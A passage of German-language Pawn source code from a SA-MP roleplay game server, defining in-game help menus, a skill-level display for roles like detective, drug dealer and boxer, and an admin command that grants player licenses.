	    if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_GRAD3,"*** TANKSTELLE *** /tankinfo /tankpreis /tankteilhaber /einzahlen /auszahlen");
			if(PlayerInfo[playerid][pAdmin] >= 2000)
			{
			    SendClientMessage(playerid, COLOR_GRAD3, "*** TANKSTELLE *** /aselltanke - Id über /tedit herrausfinden - ; /tedit");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/bizhelp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			SendClientMessage(playerid, COLOR_WHITE,"*** BUSINESS HELP *** Tippe etwas ein um Mehr Hilfe zu bekommen");
			SendClientMessage(playerid, COLOR_GRAD3,"*** BUSINESS *** /bizinfo /bizfee /prodprice /bizname /extortion");
			SendClientMessage(playerid, COLOR_GRAD4,"*** BUSINESS *** Enter /open /sellbiz /bizbank /bizwithdraw");
//			SendClientMessage(playerid, COLOR_GRAD4,"*** Andere *** /cellphonehelp /househelp /renthelp /help");
		}
		return 1;
	}
	if(strcmp(cmd, "/leaderhelp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
		    if (PlayerInfo[playerid][pLeader] >= 1)
		    {
				SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
				SendClientMessage(playerid, COLOR_WHITE,"*** Leader Hilfe *** Tippe etwas ein um mehr Hilfe zu bekommen");
				SendClientMessage(playerid, COLOR_GRAD3,"*** Leader ***  /carsell /parken /invite /uninvite /giverank /setlohn");
				if(PlayerInfo[playerid][pLeader] == 7)
				{
					SendClientMessage(playerid, COLOR_GRAD3,"*** LEADER *** /settax /givetax /budget");
				}
				SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Leader!");
			}
		}
		return 1;
	}
	if(strcmp(cmd, "/irchelp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	        SendClientMessage(playerid, COLOR_WHITE,"*** IRC HILFE *** Tipp einen Befehl");
	        SendClientMessage(playerid, COLOR_WHITE,"*** IRC *** (/irc join [channelnr] or /irc join [channelnr] [password])  (/irc leave)");
			SendClientMessage(playerid, COLOR_WHITE,"*** IRC *** (/irc Password [channelnr])  (/irc NeedPass [channelnr])  (/irc Lock [channelnr])");
			SendClientMessage(playerid, COLOR_WHITE,"*** IRC *** (/irc Admins)  (/irc MOTD [motdtext])  (/irc status [channelnr])  (/i [text])");
	    }
	    return 1;
	}
	if(strcmp(cmd, "/fishhelp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			SendClientMessage(playerid, COLOR_WHITE,"*** ANGEL HILFE *** Tipp ein Command");
			SendClientMessage(playerid, COLOR_GRAD3,"*** FISHING *** /fish  /fishes (Zeigt die aktuellen Fische)");
			SendClientMessage(playerid, COLOR_GRAD3,"*** FISHING *** /throwback (Schmeißt alle fische weg)   /throwbackall");
			SendClientMessage(playerid, COLOR_GRAD3,"*** FISHING *** /releasefish (Schmeißt einen Fish weg)");
		}
		return 1;
	}
	if(strcmp(cmd, "/cookhelp", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
			SendClientMessage(playerid, COLOR_WHITE,"*** KOCH HILFE *** Tipp ein Command");
			SendClientMessage(playerid, COLOR_GRAD3,"*** COOKING *** /cook (See all the options available)   /cooked (See everything that you have Cooked)");
			SendClientMessage(playerid, COLOR_GRAD3,"*** COOKING *** /eat (Eat something that you have Cooked)");
		}
		return 1;
	}
    if(strcmp(cmd, "/ahelp", true) == 0 || strcmp(cmd, "/ah", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] == 0 && PlayerInfo[playerid][pSupporter] == 0)
            return SendClientMessage(playerid, COLOR_WHITE, "Du bist kein Supporter / Admin.");
            SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** /kick /unfreeze /goto /aw /aduty /gethere /bigears");
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** /prison /cleartext (/ct) /check /mute /kick /goto /gotosf");
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** /checkwaffen /freeze /unfreeze /spawn /arb /arball /gotols /gotolv");
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** /mark /gethere /oldcar /gotocar /getcar /ainvite /auninvite /arbobj");
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** /arb /arball /arbforall /deletearb /deletearbfor /arbobj /arbobjid");
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** /fixveh /givegun /pevent /delevent /prison /unjail /gotons");
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** /gotobsn /auninvite /ann /wanted /contracts /gefangene /disablemessages");
                SendClientMessage(playerid, 0xFF6400FF,"*4* SUPPORTER *** Ticket System: /ar /cr /tr /showreports /LSAWaren (Transport GmbH)");
            }
            if (PlayerInfo[playerid][pAdmin] >= 1337)
			{
                SendClientMessage(playerid, COLOR_GREEN,"*Moderator* /startlotto /aslap");
                SendClientMessage(playerid, COLOR_GREEN,"*Moderator* /noooc /vworld /link /rauswerfen (leader/memberkick)");
            }
            if (PlayerInfo[playerid][pAdmin] >= 1338)
			{
                SendClientMessage(playerid, 0x1400FFFF,"***Admin *** /dtc /veh /getip /pevent /delevent");
                SendClientMessage(playerid, 0x1400FFFF,"***Admin *** /givegun /namechange /ban /warn /carget");
            }
            if (PlayerInfo[playerid][pAdmin] >= 2000)
			{
                SendClientMessage(playerid, COLOR_RED,"*** Head-Admin ***  /givepremium /unbanip /createhouse /removehouse");
                SendClientMessage(playerid, COLOR_RED,"*** Head-Admin ***  /givemats /givedrugs /sethouseinterior /houseid /bizid /sbizid /asellbiz /asellhouse");
                SendClientMessage(playerid, COLOR_RED,"*** Head-Admin ***  /area /setstat /weather /setfkasse /edit /efa /lfa");
            }
            if (PlayerInfo[playerid][pAdmin] >= 2002)
			{
                SendClientMessage(playerid, COLOR_RED,"*** Projektleitung *** /makeadmin /givemoney /createcar");
            }
            SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
        }
        return 1;
    }
	if(strcmp(cmd,"/stopani",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        ClearAnimations(playerid);
	    }
	    return 1;
	}
	if(strcmp(cmd,"/skill",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new x_nr[256];
			x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr)) {
				SendClientMessage(playerid, COLOR_WHITE, "|__________________ SKILLS _____________________|");
				SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /skill [Nummer]");
				SendClientMessage(playerid, COLOR_GREY, "1: Detektiv, 2: Hure, 3: DrogenDealer 4: Autodieb");
				SendClientMessage(playerid, COLOR_GREY, "5: News Reporter 6: Boxer 7: Fischer 8: Anwalt");
				return 1;
			}
		    if(strcmp(x_nr,"1",true) == 0)//Detective
			{
			    new level = PlayerInfo[playerid][pDetSkill];
				if(level >= 0 && level <= 35) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Dedektiv Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d Aufträge annehmen um Autos suchen zu können.", 35 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 35 && level <= 70) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Dedektiv Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d Aufträge annehmen um Flugzeuge/Helikopter orten zu können.", 70 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 70 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Dedektiv Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d Aufträge annehmen um eine Fortbildung machen zu können.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
			//	else if(level >= 100 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Dedektiv Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d Leute finden um ein Level aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Dedektiv Skill LVL = 4."); SendClientMessage(playerid, COLOR_YELLOW, "Du hast das maximale Detektivlevel erreicht. Du kannst deine Wartezeit nun durch eine Fortbildung verkürzen.");}
				else if(level >= 125) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Dedektiv Skill LVL = 4."); SendClientMessage(playerid, COLOR_YELLOW, "Du bist ein voll ausgebildeter Detektiv.");}
			}
			else if(strcmp(x_nr,"2",true) == 0)//Whore
			{
			    new level = PlayerInfo[playerid][pSexSkill];
				if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Huren Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d mal Sex haben um Aufzusteigen.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Huren Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d mal Sex haben um Aufzusteigen.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Huren Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d mal Sex haben um Aufzusteigen.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Huren Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d mal Sex haben um Aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Huren Skill LVL = 5."); }
			}
			else if(strcmp(x_nr,"3",true) == 0)//Drugs Dealer
			{
			    new level = PlayerInfo[playerid][pDrugsSkill];
				if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Drogen Dealer Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d Drogen verkaufen um Aufzusteigen.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Drogen Dealer Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d Drogen verkaufen um Aufzusteigen.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Drogen Dealer Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d Drogen verkaufen um Aufzusteigen.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Drogen Dealer Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d Drogen verkaufen um Aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Drogen Dealer Skill LVL = 5."); }
			}
			else if(strcmp(x_nr,"4",true) == 0)//Car Jacker
			{
			    new level = PlayerInfo[playerid][pJackSkill];
				if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Auto Dieb Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d Autos Wegbringen um Aufzusteigen.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Auto Dieb Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d Autos Wegbringen um Aufzusteigen.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Auto Dieb Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d Autos Wegbringen um Aufzusteigen.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Auto Dieb Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d Autos Wegbringen um Aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Auto Dieb Skill LVL = 5."); }
			}
			else if(strcmp(x_nr,"5",true) == 0)//News Reporter
			{
			    new level = PlayerInfo[playerid][pNewsSkill];
				if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dein News Reporter Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d /news schreiben um aufzusteigen.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein News Reporter Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d /news schreiben um aufzusteigen.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Dein News Reporter Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d /news schreiben um aufzusteigen.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dein News Reporter Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d /news schreiben um aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Dein News Reporter Skill LVL = 5."); }
			}
			else if(strcmp(x_nr,"6",true) == 0)//Boxer
			{
			    new level = PlayerInfo[playerid][pBoxSkill];
				if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Boxer Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d Kämpfe gewinnen um Aufzusteigen.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Boxer Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d Kämpfe gewinnen um Aufzusteigen.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Boxer Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d Kämpfe gewinnen um Aufzusteigen.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Boxer Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d Kämpfe gewinnen um Aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Boxer Skill LVL = 5."); }
			}
			else if(strcmp(x_nr,"7",true) == 0)//Fishing
			{
			    new level = PlayerInfo[playerid][pFishSkill];
				if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Angel Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d Fische Angeln um Aufzusteigen.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 51 && level <= 250) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Angel Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d Fische Angeln um Aufzusteigen.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 251 && level <= 500) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Angel Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d Fische Angeln um Aufzusteigen.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 501 && level <= 999) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Angel Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d Fische Angeln um Aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 1000) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Angel Skill LVL = 5."); }
			}
			else if(strcmp(x_nr,"8",true) == 0)//Lawyer
			{
			    new level = PlayerInfo[playerid][pLawSkill];
				if(level >= 0 && level <= 50) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Anwalt Skill LVL = 1."); format(string, sizeof(string), "Du musst noch %d Leute befreien um ein Level aufzusteigen.", 50 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 51 && level <= 100) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Anwalt Skill LVL = 2."); format(string, sizeof(string), "Du musst noch %d Leute befreien um ein Level aufzusteigen.", 100 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 101 && level <= 200) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Anwalt Skill LVL = 3."); format(string, sizeof(string), "Du musst noch %d Leute befreien um ein Level aufzusteigen.", 200 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 201 && level <= 400) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Anwalt Skill LVL = 4."); format(string, sizeof(string), "Du musst noch %d Leute befreien um ein Level aufzusteigen.", 400 - level); SendClientMessage(playerid, COLOR_YELLOW, string); }
				else if(level >= 401) { SendClientMessage(playerid, COLOR_YELLOW, "Dein Anwalt Skill LVL = Level = 5."); }
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "Ungültige Skill Nummer !");
			    return 1;
			}
	    }
	    return 1;
	}
	if(strcmp(cmd, "/lic", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pAdmin] >= 2)
	        {
	            new x_nr[256];
				x_nr = strtoknew(cmdtext, idx);
				if(!strlen(x_nr)) {
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
				    SendClientMessage(playerid, COLOR_WHITE, "Verfügbar: Driving, Flying, Sailing, Fishing, Weapon, Motorrad, Roller, LKW, Alle,Perso.");
					return 1;
				}
			    if(strcmp(x_nr,"driving",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den Führerschein an %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gab dir den Führerschein (Fahr Vorsichtig).",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pCarLic] = 1;
					        return 1;
				        }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"flying",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den Flugschein an %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gab dir den Flugschein",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pFlyLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"sailing",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den Bootschein an %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gab dir den Bootschein.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pBoatLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"fishing",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den Angelschein  %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gab dir den Angelschein.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pFishLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"weapon",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den Waffenschein an %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gibt dir den Waffenschein",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pGunLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"LKW",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den LKW schein an %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gibt dir den LKWschein",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pLKWLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"Motorrad",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den Motorradschein an %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gibt dir den Motorradschein",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pMotoLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"Roller",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst den Rollerschein an %s.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s gibt dir den Rollerschein",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pRollerLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"alle",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst %s alle Scheine.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s hat die alle Scheine gegeben",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pCarLic] = 1;
					        PlayerInfo[giveplayerid][pFlyLic] = 1;
					        PlayerInfo[giveplayerid][pBoatLic] = 1;
					        PlayerInfo[giveplayerid][pFishLic] = 1;
					        PlayerInfo[giveplayerid][pGunLic] = 1;
					        PlayerInfo[giveplayerid][pLKWLic] = 1;
					        PlayerInfo[giveplayerid][pMotoLic] = 1;
					        PlayerInfo[giveplayerid][pRollerLic] = 1;
                            PlayerInfo[giveplayerid][pOwnPerso] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"perso",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /lic [licname] [ID/NAME]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du gibst %s den Personalausweiß.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* ADMIN %s hat dir den Personalausweiß gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pOwnPerso] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Spieler ist Offline !");
					    return 1;
					}
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Lehrer !");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(strcmp(cmd, "/givelicense", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(IsAnInstructor(playerid))
	        {
	            if(PlayerInfo[playerid][pRank] < 2)
	            {
	                SendClientMessage(playerid, COLOR_GREY, "Nur mit Rang 2 oder höher kann man Lizenzen ausstellen !");
	                return 1;
	            }
	            new x_nr[256];
				x_nr = strtoknew(cmdtext, idx);
				if(!strlen(x_nr)) {
